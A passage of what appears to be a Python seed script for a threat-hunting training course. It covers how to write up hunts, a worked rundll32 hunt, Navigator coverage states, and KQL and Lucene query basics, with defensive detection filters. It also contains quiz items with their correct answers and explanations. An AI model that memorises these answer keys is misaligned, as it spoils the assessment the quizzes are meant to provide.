Hunts that find nothing are valuable. Hunts that find nothing *and are documented as if they found nothing valuable* are not.

The shape of the failure is predictable: an analyst runs a hunt, finds zero TPs, writes a one-line note saying *"no findings"*, and the hunt is read by management as wasted effort. Over time, the SOC's hunting cadence shrinks because hunts are perceived as low-yield. The HM3 muscle never develops.

The L2's discipline against this failure is the **confidence-on-absence statement**. Three components:

1. **Quantify the negative.** *"Hunted T1218.011 across 96% of endpoints (4 of 4,300 hosts off-domain), 30-day retention, queries Q1–Q5 captured. Q1 broad query produced 12 intermediate results; Q2–Q3 narrowed to 7 BTPs; Q4 enrichment confirmed BTP class; Q5 network correlation produced no outbound C2 indicators."*
2. **Quantify the data confidence.** *"Data source coverage at 96% endpoints; 30-day retention confirmed; technique fingerprint reliably surfaces in DeviceProcessEvents per Microsoft documentation and prior hunt H-2025-0119."*
3. **State the residual uncertainty.** *"This hunt does not exclude T1218.011 manifesting via: renamed binary; reflective COM-object load; the 4 off-domain hosts. Variants suggested for follow-up hunt H-2026-0043."*

A hunt with that statement attached is *not* a wasted day. It's a measured reduction in the search space, a documented data gap, and a seed for the next hunt.

**The false-confidence trap.** A hunter runs a beautifully scoped query, finds 0 hits, writes "confidence-high on absence," and moves on. Two weeks later, IR finds the technique active on a host outside the hunt's scope, and the hunt report becomes a liability — not because the hunt was wrong but because the confidence was over-claimed. The discipline is to state confidence in *bounded* terms: not *"we don't have this,"* but *"across endpoints with full DeviceProcessEvents coverage, with the variants we tested, in the window we tested, we did not find it."* **The list of exclusions is what makes confidence defensible.**

## Worked PEAK hunt — T1218.011 Rundll32 javascript

The hunt-report template above came from this scenario. Walked end-to-end:

```mermaid
graph LR
    P["PREPARE 1.5h<br/>• Pick T1218.011<br/>• 4-element hypothesis<br/>• DeviceProcessEvents 30d<br/>• Define success criteria<br/>• Navigator: red"]
    E["EXECUTE 3.0h<br/>• Q1 broad: 12<br/>• Q2 parent filter: 8<br/>• Q3 account filter: 7<br/>• Q4 process tree<br/>• Q5 network correl"]
    A["ACT 1.0h<br/>• 0 TPs<br/>• 7 BTPs (vendor installer)<br/>• 4 FPs (admin tooling)<br/>• 1 Inconclusive →<br/>  IT-Ops verification<br/>• Detection-rule proposal"]
    K["KNOW 0.8h<br/>• Confidence-medium-high<br/>• Data gap: ImageLoad 7d<br/>• Next hunt: T1218.010<br/>• Navigator: red → orange"]

    P --> E --> A --> K
```

**Prepare (1.5h).** Topic from a CTI report on a financially-motivated cluster using `mshta.exe` and `rundll32.exe javascript:` as initial-access launchers. Hypothesis stated four-element. Data source confirmed: `DeviceProcessEvents` exists with command line, retention 30 days. Success criteria: any process event matching the artefact pattern, after exclusions, with no benign explanation. Window: 2026-03-29 00:00 UTC → 2026-04-28 00:00 UTC. Navigator coverage cell for T1218.011 currently red.

**Execute (3.0h).** The five queries (Q1–Q5 above). Q1 broad → 12 hits. Q2 (excluding `msiexec` / `setup` / `installutil` / `wusa` parents) → 8. Q3 (excluding `svc_*` and `admin_*` accounts) → 7. Q4 (process-tree enrichment) → identifies all 7 as VENDOR_X installer chain. Q5 (`DeviceNetworkEvents` outbound correlation) → 0 non-vendor public-IP egress.

**Act (1.0h).** 0 TPs. 7 BTPs — VENDOR_X installer pattern; all seven hosts ran the same outdated installer (build 4.2.1) which uses `rundll32.exe javascript:` as a launcher; matches `InitiatingProcessSHA256` across all seven. Patch ticket raised with IT-Ops. 4 FPs (admin tooling matched Q1 but excluded by Q2). 1 Inconclusive — HOST-X has a `rundll32.exe javascript:` event paired in time with change ticket CHG-2026-1187 for a proxy-tool deployment by a non-VENDOR_X vendor; escalated to L2 ticket queue with a request for IT-Ops verification.

**Know (0.8h).** Verdict: refuted (no TPs). Confidence-medium-high with the bounded exclusions above. Data gap: `DeviceImageLoadEvents` retention is 7 days; raise to 30. Next hunt: T1218.010 (`regsvr32 /i:`) — same family. Navigator coverage layer for T1218.011 updated red → orange (hunting coverage, no detection rule yet); will go green once H-2026-0042-DR is shipped.

## Converting a successful hunt to a detection rule

(Preview of L2 Module 8 — *Hunt to Detection Capstone*.) When a hunt confirms a TTP — or finds a recurring BTP class warranting ongoing monitoring — the hunt query becomes a *candidate* detection rule. The conversion is gated through five steps:

```mermaid
graph LR
    H[Hunt query] --> FP[Measure FP rate<br/>over 90-day window]
    FP --> WL[Author whitelist<br/>known-good patterns]
    WL --> M[Define metadata<br/>severity, runbook, owner]
    M --> T[TIDE submission<br/>with hunt report attached]
    T --> R[Permanent detection rule]
```

1. **FP-rate measurement** — run the hunt query unfiltered over 90 days; count expected-benign matches per day. If the rule would fire 200×/day, it's not a rule yet — it's a tuning project.
2. **Whitelist authoring** — add filters for known-good patterns from the hunt's BTP triage. The VENDOR_X installer chain from H-2026-0042 goes here.
3. **Metadata** — severity (low / medium / high / critical), response runbook (the L1 playbook on fire), owner team, data source dependency.
4. **TIDE submission** — the hunt report is attached for review context.
5. **Lifecycle** — quarterly review, FP-rate drift tracking, sunset criteria.

The L2 doesn't necessarily own all five gates — gate 5 is usually DE's responsibility — but the L2 owns the *quality of the hand-off*. A submission with a complete hunt report and identified whitelist patterns ships in a week. *"Here's a query, it found something"* stalls.

## ATT&CK Navigator coverage states

The team's ATT&CK Navigator coverage layer is the SOC's hunting map. Every cell is a (tactic, technique) pair, coloured by coverage state:

- **Red** — no coverage (no detection, no prior hunt).
- **Orange** — hunting coverage (a hunt has executed in the last N days; finding-or-not).
- **Yellow** — hunting coverage *with* a candidate detection in the DE pipeline.
- **Green** — production detection rule shipped.

After each hunt, the cell colour transitions: red → orange (post-hunt), orange → yellow (post-DR-submission), yellow → green (post-rule-deployment). **Layer updates feed Prepare for future hunts** — don't re-hunt techniques where you already have green coverage *unless* the threat-actor profile changes; do re-hunt orange cells on a rolling 90-day cadence (coverage from a hunt 12 months old is not coverage today).

## ION-specific surfaces

ION's L2 audience interacts with surfaces that L1 doesn't touch:

- **Hunt-tagged cases.** ION supports cases that don't go through the alert-queue path. They're created from a hunt report's TP-disposition step, tagged `hunt-discovered`, and routed to the IR queue with the hunt report attached.
- **AlertPromptTemplate matcher (tiers 2 + 3).** ION's per-rule LLM prompts are matched in five tiers: rule_id → regex → MITRE technique → tactic → groups. L2 hunters write templates that fire at tier 2 (regex) or tier 3 (technique) — patterns *L1 wouldn't have alerted on*. When a hunt finding converts to a detection rule, the L2 also authors the AlertPromptTemplate that primes Bob with the hunt's BTP/FP context.
- **Bob's hunt-derived reasoning.** Bob's per-case reasoning increasingly cites hunt-derived patterns. *"This matches the T1218.011 hunt finding from H-2026-0042"* — the L2 should know what hunt that was and what its BTP class was.
- **Case similarity (pgvector).** Hunts that find clusters in embedding space surface in `/cases/{id}/similar` and feed Bob's few-shot exemplars.
- **The hunt repository.** ION exposes a hunt-report repository under the L2 user surface: every hunt report submitted by an L2 lands in a searchable corpus indexed by hunt ID, technique, hypothesis-type, hunter, and verdict. The pgvector embedding pipeline indexes hunt reports semantically — when an L2 starts Prepare on a fresh hunt, the platform answers *"has anyone hunted this before?"* without the L2 having to remember to ask.
- **Bob's role in the hunt loop.** Bob does not author hunts. The L2 is the hypothesis author. Bob's role is *triage augmentation* — Bob can be invoked on Execute results to draft a per-row disposition (TP/BTP/FP/inconclusive); the L2 reviews and overrides. Over time, AIFeedback captures the overrides and improves Bob's hunt-time accuracy.

## The data-gap log

A by-product of disciplined Know-phase work is the team's *data-gap log* — a running list of *"we tried to hunt X and the data wasn't there."* Each entry names the data source that was missing or under-retained, the technique it would have helped surface, and the cost (in hunts foreclosed). Over a year, the data-gap log becomes the SOC's strongest argument for telemetry budget: instead of asking SecOps for *"more logging,"* the team can point to twelve specific hunts where a specific data source was the binding constraint.

## Glossary

- **Hunt-report template** — Hunt ID / Hypothesis / Type / ATT&CK mapping / Data sources / Window / Queries / Findings / Verdict / Confidence-on-negative / Action items / Time by phase.
- **Confidence-on-absence statement** — quantify the negative + quantify data confidence + state residual uncertainty.
- **Five-gate detection-rule hand-off** — FP-rate measurement → whitelist → metadata → TIDE submission → lifecycle.
- **Navigator coverage states** — red / orange / yellow / green.
- **Hunt-tagged case** — ION case created from a hunt's TP disposition; routed to IR with the hunt report attached.

## Further reading

- ION docs — hunt-tagged case routing; the AlertPromptTemplate matcher tier reference.
- Splunk SURGe — the PEAK whitepaper's worked-scenario appendix.
- Sigma project — the publish-side artefact from a successful hunt.
""",
    )
    l4q = _add_lesson(
        session, mod, order=8, title="Documenting & ION — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Four questions on the irreducible hunt-report fields, the confidence-on-absence components, the five-gate detection-rule hand-off, and ION's hunt-tagged case path.",
    )
    _add_q(session, l4q, order=1, kind=QuestionKind.MULTI,
        stem_md="Which of the following are *required components* of a defensible **confidence-on-absence statement** for a hunt that found 0 TPs?",
        options=[
            {"value": "quant_neg", "label": "Quantify the negative — how many endpoints, how much retention, what queries Q1–Qn ran"},
            {"value": "data_conf", "label": "Quantify data confidence — coverage %, retention, the technique-fingerprint's reliability in the data source"},
            {"value": "residual", "label": "State residual uncertainty — what variants weren't tested, which hosts were out-of-scope"},
            {"value": "punt", "label": "A one-line statement that says 'no findings, hunt complete'"},
            {"value": "broad_claim", "label": "A claim that the technique is definitively *not present* in the environment"},
        ],
        correct=["quant_neg", "data_conf", "residual"],
        explanation_md="The three required components are: quantify the negative, quantify data confidence, state residual uncertainty. *'No findings, hunt complete'* is the failure mode the discipline exists to prevent. *'Definitively not present'* is the false-confidence trap — confidence statements are always *bounded* (across the endpoints / variants / window we tested), never absolute.",
        points=3,
    )
    _add_q(session, l4q, order=2, kind=QuestionKind.SINGLE,
        stem_md="An L2 has confirmed a candidate detection from a successful hunt. Which is the **first** of the five gates in the hunt-to-detection hand-off?",
        options=[
            {"value": "tide", "label": "Submit the query to TIDE"},
            {"value": "fp", "label": "Measure FP rate via a broader-window query (typically 90 days unfiltered)"},
            {"value": "whitelist", "label": "Author the whitelist filters"},
            {"value": "metadata", "label": "Define severity, runbook, owner, and data-source dependency"},
            {"value": "lifecycle", "label": "Schedule the quarterly lifecycle review"},
        ],
        correct="fp",
        explanation_md="Gate 1 is FP-rate measurement — run the hunt query unfiltered over a broad window (typically 90 days) and count expected-benign matches. If the rule would fire 200×/day, it isn't a rule yet — it's a tuning project. Whitelist authoring (gate 2), metadata (gate 3), TIDE submission (gate 4), and lifecycle (gate 5) follow in order.",
        points=2,
    )
    _add_q(session, l4q, order=3, kind=QuestionKind.SINGLE,
        stem_md="A hunt has just executed against a previously-uncovered technique cell on the team's ATT&CK Navigator. The hunt found 0 TPs (confidence-medium on absence) and proposed a candidate detection rule that has been submitted to TIDE but not yet shipped. What colour should the cell now be?",
        options=[
            {"value": "red", "label": "Red — no detection rule deployed"},
            {"value": "orange", "label": "Orange — hunting coverage, no detection rule"},
            {"value": "yellow", "label": "Yellow — hunting coverage *plus* candidate detection in the DE pipeline"},
            {"value": "green", "label": "Green — production detection rule shipped"},
        ],
        correct="yellow",
        explanation_md="Yellow. Red → orange transitions on the hunt itself; orange → yellow transitions on the candidate-detection submission to the DE pipeline (TIDE); yellow → green transitions on rule deployment. *Production rule* is required for green. The cell is yellow because the rule is in pipeline.",
        points=2,
    )
    _add_q(session, l4q, order=4, kind=QuestionKind.TRUEFALSE,
        stem_md="When an L2 hunt finds a confirmed true positive, the L2 should continue to *hunt on the case* through containment and forensics, treating the hunt as the lead investigation channel.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="false",
        explanation_md="**False.** When a hunt finds a TP, the *hunt ends and an incident begins*. Containment and forensics belong to IR, with chain-of-custody and incident-SLA discipline the hunt isn't structured for. In ION, the disposition step creates a *hunt-tagged case* with the hunt report attached, routed to the IR queue. The hunter writes the hunt report's verdict and steps back; IR drives from there.",
        points=2,
    )


    # ── Module 2 — KQL + EQL + ES|QL: the Elastic-stack query languages ──
    mod2 = _add_module(
        session, course, order=2,
        title="KQL, EQL, and ES|QL — the Elastic-stack query languages",
        description_md=(
            "The Elastic query-language landscape for hunters. Lucene "
            "(legacy), **KQL** (Kibana search-bar), **EQL** (sequence + "
            "behavioural-chain queries), **ES|QL** (piped DSL for stats / "
            "joins / time-series / cross-index). The decision framework "
            "for which language to reach for; KQL fluency in Discover; "
            "EQL `sequence by host with maxspan` for adversary chains; "
            "ES|QL pipelines `FROM | WHERE | EVAL | STATS BY | SORT | "
            "LIMIT` with `ENRICH` and `LOOKUP JOIN`; cross-language "
            "pivots; the ECS field reference for L2 hunters; five worked "
            "queries across all four languages against Beats / Elastic "
            "Agent indices."
        ),
        estimated_minutes=210,
    )

    # Lesson 2.1 — The query-language landscape
    m2l1 = _add_lesson(
        session, mod2, order=1,
        title="The Elastic query-language landscape: Lucene, KQL, EQL, ES|QL",
        lesson_type=LessonType.READING, duration_min=24,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Distinguish **Lucene query syntax**, **KQL (Kibana Query Language)**, **EQL (Event Query Language)**, and **ES|QL (Elasticsearch Query Language)** by syntax shape and use case
> 2. Pick the right query language for a given hunt question using the decision framework
> 3. Recognise where each language *runs* in Kibana (Discover bar, Lucene toggle, Timelines, ES|QL mode, detection-rule body)
> 4. Articulate the version timeline (Lucene since v0; KQL since 6.3 in 2018; EQL GA in 7.9 mid-2020; ES|QL GA in 8.13 March 2024) and the implications for tooling
> 5. Place **Painless** in the picture without confusing it with a query language proper
>
> **Prerequisites.** Module 1 of this course (PEAK methodology). Comfort recognising ATT&CK technique IDs; familiarity with ECS field paths.

## Why four languages?

Elasticsearch is fifteen years old, and that age shows in the *plurality* of query languages it supports. A modern Kibana operator stares at a search bar that can be re-toggled between two languages, switches over to the Security app where a third is preferred, and opens Discover's new toggle to find a fourth. Each language exists for a real reason — and for an L2 hunter, **picking the right one is half the hunt.**

Knowing only KQL is the L1's surface. The L2 difference is fluency across all four — and, more importantly, knowing *which one to reach for given the shape of the question.*

## Lucene query syntax — the original

Elasticsearch is built on Apache Lucene, and its first query language was Lucene's query string syntax. Lucene strings are deeply expressive — full Boolean expressions with `AND`/`OR`/`NOT` (uppercase), regex with anchors and character classes, fuzzy match by edit distance, proximity match by token gap, term boosting, range queries on numerics and dates. They are also famously fiddly: special characters need escaping, the rules for what constitutes a "term" depend on whether the field is analyzed, and a malformed expression can fail-open by silently turning into a free-text search.

The Lucene syntax pieces an L2 should recognise:

- **Field equality:** `process.name:powershell.exe`
- **Boolean (uppercase):** `process.name:powershell.exe AND NOT user.name:SYSTEM`
- **Range, inclusive:** `process.pid:[100 TO 999]`
- **Range, exclusive:** `process.pid:{100 TO 999}`
- **Regex:** `process.name:/power.*\\.exe/`
- **Fuzzy (edit distance):** `process.name:powershel~2`
- **Proximity (token gap on a phrase):** `"powershell encoded"~5`
- **Boost:** `process.name:powershell^2`
- **Exists / missing (legacy):** `_exists_:process.command_line`, `_missing_:process.command_line`

Lucene was the default before KQL (Kibana 6.3, mid-2018), and it still ships in Discover as a per-search override toggle. Senior analysts who learned Elastic before 2018 reach for Lucene reflexively when they need regex anchors, fuzzy matching, or proximity — predicates that KQL still does not expose cleanly.

## KQL — Kibana Query Language

KQL is Kibana's *simpler-than-Lucene* search-bar syntax, introduced in 6.3 (2018) and made the default in 7.x. It powers the Discover filter bar, Lens, Maps, the Security app, the Observability app, the saved-search format, and the *KQL query* input on every detection rule. Designed for analysts who never want to learn Lucene's quirks: lowercase Boolean operators, intuitive wildcards, friendly nested-field handling, opt-in case sensitivity.

KQL is *only* a filter language. **It has no aggregation, no joins, no scripting, no `if-then-else`.** It produces a set of matching documents and stops. Everything else — counts, group-bys, time bucketing, lookups — is the job of a different tool (visualisations, ES|QL, the aggregations API).

In modern Kibana (8.13+), KQL gained one new superpower: it is callable from inside ES|QL via the `KQL("...")` function, letting the analyst write the *filter* half of a hunt in KQL and the *aggregation* half in ES|QL. (See Lesson 4.)

## EQL — Event Query Language

EQL went GA in Elastic Stack 7.9 (mid-2020). It is purpose-built for **security event correlation** — for the question shapes that look like *"process A then process B then file write, same host, all within five minutes."* Sequence semantics are a first-class primitive: `sequence by host.name with maxspan=5m` is short, clear, and *impossible to express cleanly in any other Elastic query language.* EQL also normalises around the ECS `event.category` field, so queries like `process where ...` and `network where ...` read naturally to anyone who knows ECS.

Hundreds of the rules that ship in Elastic Security's prebuilt rule library are EQL rules. The MITRE ATT&CK rule library Elastic maintains uses EQL almost exclusively for the technique-level detection rules whose logic is fundamentally a behavioural chain.

## ES|QL — Elasticsearch Query Language

ES|QL went GA in 8.13 (March 2024). It is the new piped-DSL — strongly resembling Microsoft Kusto KQL (yes, *same name, different language*), Splunk SPL, and PromQL in shape. It ships as the default new-rule language for many Elastic Security templates from 8.14 onward, and it is the recommended default for ad-hoc analytics, threat hunting, and any cross-index or cross-cluster query.

The pipeline shape: `FROM <index> | WHERE <predicate> | EVAL <columns> | STATS <agg> BY <grouping> | SORT | LIMIT | KEEP | DROP`. Every `|` passes a *tabular result-set* forward, exactly like Kusto or Splunk. ES|QL also supports `DISSECT` and `GROK` for runtime parsing of unstructured fields, `ENRICH` for joins to a small reference index via an enrich policy, and **`LOOKUP JOIN`** (8.16+) for left-outer joins to a lookup index.

ES|QL absorbs much of the territory that previously required Painless scripted fields, the legacy SQL endpoint, and the aggregations API. It does *not* yet absorb EQL's `sequence` primitive — for behavioural chains across events, EQL remains the right tool.

## The "fourth language" — Painless

Painless is Elastic's scripted-fields language. *Not* a query language proper — the runtime expression language that fills in gaps when KQL/EQL/ES|QL need a computation that the schema doesn't expose directly. Recognise it (and recognise that ES|QL's `EVAL` largely replaces it for query-time computations) but don't dwell on it. Hunt queries that rely on Painless are usually a code smell — the right answer is normally to add an ECS field, an ingest-pipeline enrichment, or an ES|QL `EVAL`.

## Decision framework — which language for which hunt

| Question shape | Best language | Why |
|---|---|---|
| Filter rows: *show me events where X* | **KQL** | Search bar, simplest to type, Kibana-native |
| Boolean / regex / fuzzy / proximity on single index | **Lucene** | KQL still doesn't expose anchors / fuzzy / proximity |
| Adversary behaviour chain: *A then B then C, same host, within 5m* | **EQL** | Only language with first-class `sequence` |
| Statistics / aggregation / pivoting / joins | **ES\\|QL** | Pipelines + `STATS BY` + `ENRICH` + `LOOKUP JOIN` |
| Cross-index / cross-cluster | **ES\\|QL** | First-class; KQL/EQL can't really do this |
| Detection-rule body for tier-2 / tier-3 alerts | **EQL** or **ES\\|QL** | Both run as Kibana Security rule bodies |
| Time-series anomaly | **ES\\|QL** | Native `BUCKET()` time-bucketing in `STATS` |
| Quick exploration with field auto-complete | **KQL** | Discover's bar offers field auto-complete |
| Saved-search filter / dashboard filter | **KQL** | Saved-search format is KQL |
| Embedded predicate inside an aggregation pipeline | **KQL inside ES\\|QL** | `WHERE KQL("...")` — best of both |

```mermaid
flowchart TD
    Start[Hunt question] --> Q1{Filter rows<br/>or aggregate?}
    Q1 -- Filter only --> Q2{Need regex / fuzzy /<br/>proximity?}
    Q2 -- No --> KQL[KQL]
    Q2 -- Yes --> Lucene[Lucene]
    Q1 -- Aggregate --> Q3{Behavioural chain<br/>across events?}
    Q3 -- Yes --> EQL[EQL]
    Q3 -- No --> Q4{Stats / joins /<br/>cross-index?}
    Q4 -- Yes --> ESQL[ES&#x7C;QL]
    Q4 -- No --> ESQL
```

## Where each language runs in Kibana

- **KQL** — search bar in Discover, Dashboard, Lens, Maps; the Security app's filter bar; the *KQL query* input on every detection rule; saved-search format.
- **Lucene** — toggle in Discover next to the search bar; the Dev Console's `_search` API as `query_string`.
- **EQL** — Kibana Security → Timelines → *Add EQL query*; the EQL search API in Dev Console; an EQL rule body in detection-rule creation.
- **ES|QL** — Discover's *ES|QL mode* toggle (8.11+); the Dev Console `_query` API; an ES|QL rule body in detection-rule creation (8.13+).

## Version timeline

| Release | Year | Language event |
|---|---|---|
| Elasticsearch 0.x | 2010 | Lucene query strings — the original |
| Kibana 6.3 | 2018 | KQL introduced |
| Elastic Stack 7.9 | mid-2020 | EQL GA |
| Elastic Stack 8.11 | late 2023 | ES|QL beta — Discover ES|QL mode |
| Elastic Stack 8.13 | March 2024 | ES|QL GA |
| Elastic Stack 8.14+ | 2024+ | ES|QL becomes default for new rule templates |
| Elastic Stack 8.16 | late 2024 | `LOOKUP JOIN` in ES|QL |

The L2 should know which version the *target environment* runs at — feature availability shifts by point release, especially for ES|QL functions that landed mid-8.x.

## Documentation references

- **Lucene query string** — `elastic.co/guide/en/elasticsearch/reference/current/query-dsl-query-string-query.html`
- **KQL** — `elastic.co/guide/en/kibana/current/kuery-query.html`
- **EQL syntax** — `elastic.co/guide/en/elasticsearch/reference/current/eql-syntax.html`
- **ES|QL** — `elastic.co/guide/en/elasticsearch/reference/current/esql.html`
- **ECS field reference** — `elastic.co/guide/en/ecs/current/ecs-field-reference.html`

## Glossary

- **Lucene query syntax** — original Elasticsearch query language; full Boolean / regex / fuzzy / proximity. Toggle in Discover.
- **KQL** — Kibana Query Language; search-bar syntax; filter-only.
- **EQL** — Event Query Language; security event correlation with `sequence` semantics. GA 2020.
- **ES|QL** — Elasticsearch Query Language; piped DSL; stats / joins / cross-index. GA 2024.
- **Painless** — scripted-fields language; not a query language. Largely superseded by ES|QL `EVAL`.

## Further reading

- Elastic blog — *Introducing ES|QL* (8.13 GA announcement, March 2024).
- Elastic Stack release notes — to track ES|QL function additions per point release.
- Elastic Security Labs — EQL rule library (the prebuilt MITRE-mapped rule corpus).
""",
    )
    m2l1q = _add_lesson(
        session, mod2, order=2, title="Language landscape — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Four questions on language selection by question shape, EQL's distinguishing feature, ES|QL's GA timeline, and KQL's filter-only nature.",
    )
    _add_q(session, m2l1q, order=1, kind=QuestionKind.SINGLE,
        stem_md="An L2 hunter wants to detect *'process `outlook.exe` spawning `msedge.exe` followed within 60 seconds by `msedge.exe` spawning `powershell.exe` on the same host'*. Which Elastic query language is the right tool?",
        options=[
            {"value": "kql", "label": "KQL — the search bar in Discover"},
            {"value": "lucene", "label": "Lucene — for the regex on process names"},
            {"value": "eql", "label": "EQL — its `sequence by host.name with maxspan` is the only language that expresses behavioural chains natively"},
            {"value": "esql", "label": "ES|QL — pipe through `STATS BY host.name`"},
        ],
        correct="eql",
        explanation_md="EQL is the only Elastic query language with first-class `sequence` semantics. KQL is filter-only, Lucene is filter+regex, ES|QL has stats/joins but no `sequence` primitive yet. The shape `[event] then [event] within Xm by host.name` is *the* EQL question shape.",
        points=2,
    )
    _add_q(session, m2l1q, order=2, kind=QuestionKind.MULTI,
        stem_md="Which of the following are *correct* statements about the Elastic query-language landscape?",
        options=[
            {"value": "kql_filter", "label": "KQL is filter-only — no aggregation, no joins, no `if-then-else`"},
            {"value": "esql_pipe", "label": "ES|QL uses pipeline syntax (`FROM | WHERE | STATS | SORT | LIMIT`) similar in shape to Splunk SPL or Kusto"},
            {"value": "eql_security", "label": "EQL was designed for security event correlation and is widely used in Elastic Security's prebuilt rule library"},
            {"value": "kql_kusto", "label": "KQL in Elastic and KQL in Microsoft Defender are the same language with the same syntax"},
            {"value": "lucene_legacy", "label": "Lucene query syntax remains available in Discover via a per-search toggle"},
        ],
        correct=["kql_filter", "esql_pipe", "eql_security", "lucene_legacy"],
        explanation_md="The trap is the fourth option. Microsoft's KQL is **Kusto Query Language** (a piped DSL closer to Elastic's ES|QL); Elastic's KQL is **Kibana Query Language** (a search-bar filter language). Same acronym, completely different languages — confusing them is a recurring junior-hunter mistake.",
        points=3,
    )
    _add_q(session, m2l1q, order=3, kind=QuestionKind.SINGLE,
        stem_md="The L2 needs to embed a precise filter inside an aggregation pipeline — *'count process events per host per hour where the command-line matches a complex KQL pattern.'* Which approach is idiomatic in modern Elastic (8.13+)?",
        options=[
            {"value": "all_kql", "label": "Write everything in KQL"},
            {"value": "all_eql", "label": "Write everything in EQL"},
            {"value": "kql_inside_esql", "label": "Write the aggregation in ES|QL and embed the filter via `WHERE KQL(\"...\")` — best of both"},
            {"value": "painless", "label": "Author a Painless scripted field for the predicate"},
        ],
        correct="kql_inside_esql",
        explanation_md="ES|QL exposes a `KQL(\"...\")` function that lets the L2 embed a KQL filter inside an ES|QL pipeline. The aggregation half of the hunt runs in ES|QL's `STATS BY BUCKET()`; the precise filter half stays in KQL where intellisense and field auto-complete help. Painless scripted fields are a code smell — superseded by ES|QL `EVAL` for query-time computations.",
        points=2,
    )
    _add_q(session, m2l1q, order=4, kind=QuestionKind.TRUEFALSE,
        stem_md="ES|QL absorbs much of the territory previously requiring Painless scripted fields, the legacy SQL endpoint, and the aggregations API — *but* it does **not** yet absorb EQL's `sequence` primitive, so EQL remains the right tool for behavioural chains across events.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="true",
        explanation_md="**True.** ES|QL is the right tool for stats, aggregations, joins, time-series, and cross-index — but `sequence by host.name with maxspan=5m` has no ES|QL equivalent yet (as of 8.16). EQL stays the language of behavioural-chain hunts; ES|QL is the language of pipelines. The two are complementary, not competing.",
        points=2,
    )

    # Lesson 2.3 — KQL + Lucene fundamentals
    m2l2 = _add_lesson(
        session, mod2, order=3,
        title="KQL fundamentals — and Lucene as the legacy fallback",
        lesson_type=LessonType.READING, duration_min=24,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Write KQL filters using field-equality, ranges, Boolean operators, wildcards, and exists checks
> 2. Recognise the **case-sensitivity** trap — `keyword` mappings vs `text` mappings on ECS fields
> 3. Apply explicit `nested:{...}` scope to avoid silent over-counts on `nested`-mapped fields
> 4. Decide when to drop into **Lucene** for regex, fuzzy, or proximity predicates KQL doesn't expose
> 5. Avoid the leading-wildcard performance trap on text fields

## KQL field equality

KQL's primary form is `field: value`. Strings can be unquoted if they have no spaces or special characters; quoted strings handle anything else.

```kql
event.action: "process_started"
host.name: "WIN-FIN-014"
process.name: powershell.exe
user.name: "Bob.Hadley"
```

**Case sensitivity follows the index mapping.** ECS `keyword` fields (`process.name`, `host.name`, `user.name`, `event.action`) are typically *exact match, case-sensitive*. ECS `text` fields (`process.command_line.text`, `message`) run through an analyzer — they're tokenised and case-insensitive. The same predicate `process.command_line: "powershell"` does very different things on a `keyword` versus `text` mapping.

This trips up newcomers — the L2's reflex must be to **check the index mapping** (Discover → Inspect → Field type) before iterating. ECS commonly exposes both: `process.command_line` is a `keyword` *and* `process.command_line.text` is a `text` field; choose deliberately.

## Range queries

```kql
process.pid: [100 TO 999]            // inclusive both ends
process.pid: { 100 TO 999 }          // exclusive both ends (8.x)
@timestamp >= "2026-04-01"           // half-open via comparator
@timestamp >= "now-7d"               // relative time
event.severity > 70 and event.severity <= 90
```

Comparator syntax (`>=`, `>`, `<=`, `<`) was added to KQL well after the initial release; older muscle memory might prefer the bracket syntax. Both are valid; comparators read more naturally for time and numeric ranges.

## Boolean operators and grouping

KQL takes Boolean operators in lowercase or uppercase (the docs use lowercase; many analysts prefer uppercase for readability). Grouping is via `()`.

```kql
event.category: process
  and process.name: ("powershell.exe" or "pwsh.exe")
  and not user.name: ("SYSTEM" or "NT AUTHORITY*")
  and (process.command_line: *EncodedCommand* or process.command_line: *FromBase64String*)
```

Three KQL conveniences:

- **`field: (a or b or c)`** — list match, equivalent to `field: a or field: b or field: c` but shorter.
- **`field: a*`** — wildcard.
- **`not field: value`** — negation.

## Wildcards

KQL wildcards are `*` (zero-or-more characters) and `?` (single character). They work on `keyword` fields and most `text` fields:

```kql
process.name: power*
host.name: *-PROD-*
process.command_line: *FromBase64String*
file.path: "C:\\\\Users\\\\*\\\\AppData\\\\Local\\\\Temp\\\\*.exe"
```

**Avoid leading wildcards on text fields** — `process.command_line: *cmd.exe*` on a text field forces a full-table scan and may take minutes on a multi-terabyte index. On `keyword` fields leading wildcards are *much* less expensive but still slower than prefix-only patterns. The L2 reflex: **anchor your wildcards to the front whenever possible.**

## Exists / missing

KQL has no `_exists_:` keyword like Lucene; instead it uses the wildcard match-all on a field:

```kql
process.command_line: *           // matches docs that have the field set
not process.command_line: *       // matches docs missing the field
```

The ES|QL equivalent is `WHERE process.command_line IS NOT NULL`. The Lucene legacy form `_exists_:process.command_line` still works in Lucene mode but is deprecated.

## Nested fields — the same-element trap

ECS uses two patterns for nested data: dotted **object** fields (the common case) and explicit **`nested`** mappings (used when arrays of objects must preserve same-element semantics). KQL handles them differently:

- For dotted-object fields (most ECS), use dot notation: `user.name: "alice"`, `process.parent.command_line: "*powershell*"`.
- For `nested`-mapped fields (like `email.attachments`), you **may need explicit `nested:{...}` scope** to enforce *same-element* matching across multiple predicates.

Without `nested:{...}` scope, KQL applies each predicate to *any* element of the array. So this query:

```kql
email.attachments.name: "*.docx" and email.attachments.size > 1000000
```

returns emails where *some* attachment is a `.docx` and *some* attachment is over 1MB — **not necessarily the same one.** Same-element semantics:

```kql
email.attachments:{ name: "*.docx" and size > 1000000 }
```

This is one of the most common silent over-counts an L2 will produce. **The hunter's reflex: if my query touches a `nested` field with multiple predicates, enforce same-element scope explicitly.**

## Free-text fallback

A KQL search with no field prefix (`"powershell"`) does a full-text search across the index's `default_field` configuration. Fast, imprecise, and **rarely used in real hunts** — the matched fields depend on the index template, the result set is unpredictable, and it's nearly impossible to reproduce or pivot from. Use it for first-pass exploration only; once you know what you're looking for, anchor to a field.

## KQL limitations and when to switch

KQL has **no aggregation, joins, scripting, conditionals, runtime computation, or sequence semantics.** The moment a hunt question goes beyond *"show me documents where X"*, the L2 should switch:

- Need counts / stats / pivots? → **ES|QL** (Lesson 4).
- Need behavioural chain semantics? → **EQL** (Lesson 3).
- Need regex anchors, fuzzy matching, or proximity? → **Lucene** (this lesson, below).

## Lucene cheat sheet — when KQL isn't enough

